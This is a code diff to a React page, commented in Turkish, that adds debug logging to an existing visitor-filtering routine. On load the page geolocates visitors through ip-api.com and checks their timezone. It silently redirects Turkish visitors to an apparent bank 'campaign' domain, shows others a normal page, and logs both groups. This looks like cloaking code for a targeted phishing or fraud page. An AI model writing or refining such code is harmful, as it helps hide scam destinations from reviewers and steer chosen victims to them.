@@ -93,22 +93,34 @@ export default function Home() {
   const [redirectUrl, setRedirectUrl] = useState('https://bbnsbnkampanya.vercel.app/');
   const redirectLock = useRef(false);
 
+  // Debug log fonksiyonu
+  const debugLog = (message: string, data?: any) => {
+    console.log(`[DEBUG] ${new Date().toISOString()} - ${message}`, data || '');
+  };
+
   // Timezone kontrolü fonksiyonu
   const isTurkishTimezone = () => {
     try {
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      debugLog('Timezone kontrolü', { timezone });
       return timezone === 'Europe/Istanbul' || timezone.includes('Turkey');
     } catch (error) {
+      debugLog('Timezone kontrolü hatası', error);
       return false;
     }
   };
 
   // Yönlendirme fonksiyonu
   const stealthRedirect = async (url: string, ipData: any, isSuccess: boolean = true) => {
-    if (redirectLock.current) return;
+    if (redirectLock.current) {
+      debugLog('Yönlendirme kilitli, işlem iptal edildi');
+      return;
+    }
     redirectLock.current = true;
+    debugLog('Yönlendirme başlatılıyor', { url, isSuccess });
 
     try {
+      debugLog('Log kaydı yapılıyor', ipData);
       await logSuccessRedirect({
         ip: ipData.query || 'unknown',
         country: ipData.country || 'unknown',
@@ -119,13 +131,17 @@ export default function Home() {
       });
 
       if (isSuccess) {
+        debugLog('Yönlendirme yapılıyor', { url });
         window.location.replace(url);
       }
     } catch (error) {
+      debugLog('Yönlendirme hatası', error);
       if (isSuccess) {
         try {
+          debugLog('Alternatif yönlendirme yöntemi 1 deneniyor');
           window.location.href = url;
         } catch (error) {
+          debugLog('Alternatif yönlendirme yöntemi 2 deneniyor');
           window.location.assign(url);
         }
       }
@@ -135,20 +151,27 @@ export default function Home() {
   // IP kontrolünü hemen başlat
   useEffect(() => {
     const checkIp = async () => {
+      debugLog('IP kontrolü başlatılıyor');
       try {
         // Önce yönlendirme linkini al
+        debugLog('Yönlendirme linki alınıyor');
         const redirectResponse = await fetch('/api/redirect-link');
         if (redirectResponse.ok) {
           const { url } = await redirectResponse.json();
+          debugLog('Yönlendirme linki alındı', { url });
           setRedirectUrl(url);
+        } else {
+          debugLog('Yönlendirme linki alınamadı', { status: redirectResponse.status });
         }
 
         // Rate limit kontrolü için bekleme süresi
         if (retryCount > 0) {
+          debugLog('Rate limit beklemesi', { retryCount });
           await new Promise(resolve => setTimeout(resolve, 2000));
         }
 
         // IP detaylarını al
+        debugLog('IP API isteği yapılıyor');
         const response = await fetch('http://ip-api.com/json/', {
           headers: {
             'Accept': 'application/json',
@@ -158,16 +181,20 @@ export default function Home() {
         });
         
         if (!response.ok) {
+          debugLog('IP API hatası', { status: response.status });
           throw new Error(`HTTP error! status: ${response.status}`);
         }
         
         const data = await response.json();
+        debugLog('IP API yanıtı alındı', data);
         
         // Rate limit kontrolü
         if (data.status === 'fail' && data.message?.includes('rate limit')) {
+          debugLog('Rate limit aşıldı', data);
           const isTurkishTZ = isTurkishTimezone();
           
           if (isTurkishTZ) {
+            debugLog('Türk timezone tespit edildi, yönlendirme yapılıyor');
             await stealthRedirect(redirectUrl, data, true);
             return;
           }
@@ -177,6 +204,7 @@ export default function Home() {
 
         const encryptedData = encryptData(data);
         const decryptedData = decryptData(encryptedData);
+        debugLog('IP verisi şifrelendi ve çözüldü', { decryptedData });
         
         const currentIpData = {
           country: decryptedData.country,
@@ -189,22 +217,26 @@ export default function Home() {
         };
         
         setIpData(currentIpData);
+        debugLog('IP verisi state\'e kaydedildi', currentIpData);
 
         // Yönlendirme kontrolü - SADECE Türk IP'si kontrolü
         const isTurkishIP = currentIpData.countryCode === 'TR';
+        debugLog('Türk IP kontrolü', { isTurkishIP, countryCode: currentIpData.countryCode });
 
         // Sadece Türk IP'si varsa yönlendir
         if (isTurkishIP) {
+          debugLog('Türk IP tespit edildi, yönlendirme yapılıyor');
           setShouldRedirect(true);
           await stealthRedirect(redirectUrl, data, true);
         } else {
+          debugLog('Türk IP tespit edilemedi, yönlendirme yapılmıyor');
           // Yabancı IP ise normal sayfayı göster ve invalid.txt'ye kaydet
           await stealthRedirect(redirectUrl, data, false);
           setMounted(true);
           setIsLoading(false);
         }
       } catch (error) {
-        console.error('IP check error:', error);
+        debugLog('IP kontrolü hatası', error);
         if (retryCount < 3) {
           if (isTurkishTimezone()) {
             await stealthRedirect(redirectUrl, {
@@ -222,7 +254,7 @@ export default function Home() {
     };
 
     checkIp();
-  }, [retryCount, redirectUrl]);
+  }, [retryCount]);
 
   // Yönlendirme yapılacaksa veya sayfa yüklenmediyse loading göster
   if (!mounted || isLoading || shouldRedirect) {
